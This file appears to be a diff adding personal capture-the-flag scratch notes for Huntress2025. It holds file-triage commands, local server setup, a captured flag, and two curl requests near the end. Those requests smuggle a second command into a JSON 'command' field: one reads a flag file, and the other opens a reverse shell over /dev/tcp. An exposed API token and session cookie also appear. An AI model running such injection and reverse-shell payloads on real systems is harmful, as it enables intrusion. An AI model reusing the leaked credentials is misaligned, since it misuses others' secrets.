@@ -1,0 +1,50 @@
+# 1) Quick triage
+file snooze
+xxd -l 64 snooze
+binwalk -e --run-as=root snooze
+strings -n 6 snooze | grep -i -oP 'flag\{[^}]{0,200}\}' || true
+exiftool snooze | grep -i 'comment\|desc\|author\|software'
+
+# 2) If it “looks zipped” or like nested archives, go matryoshka:
+binwalk -Me --run-as=root snooze
+grep -RiaoP 'flag\{[^}]{0,200}\}' _snooze.extracted || true
+
+
+
+
+# 1) activate venv
+python3 -m venv venv        # only once if you already created venv
+. venv/bin/activate
+
+# 2) set (export) the token in this shell
+export ARIKA_API_TOKEN="110336b94f61324f6bbd68259f6f61ed"
+# confirm it's set
+echo "$ARIKA_API_TOKEN"
+
+# 3) install deps (if not already)
+pip install -r requirements.txt
+
+# 4) run the server in the foreground so you can see logs (recommended)
+python3 app.py
+
+
+# create a strong token
+export ARIKA_API_TOKEN="$(openssl rand -hex 16)"
+echo "$ARIKA_API_TOKEN"   # copy it somewhere safe for testing
+110336b94f61324f6bbd68259f6f61ed
+
+
+flag{c1c07c90efu58876a97c44c2b175903e}
+
+curl -s -k 'https://19aeebf7.proxy.coursestack.com/' \
+  -H 'Accept: application/json' \
+  -H 'Content-Type: application/json' \
+  -H 'Cookie: token=19aeebf7-74d7-426a-8e83-b6b8a5d9933c_1_8f81c68dabf0ee1c95b7be7568465589d35a9e5d859836a85896eb9487d333f1' \
+  -d '{"command":"help\ncat /app/flag.txt"}'
+
+  
+  curl -s http://localhost:8000/ \
+  -H 'Content-Type: application/json' \
+  -d '{"command":"help\n/bin/bash -lc \"exec bash -i >& /dev/tcp/host.docker.internal/4444 0>&1\""}'
+  
+Huntress2025 (may be github?  for sp34rh34d Discord friend)
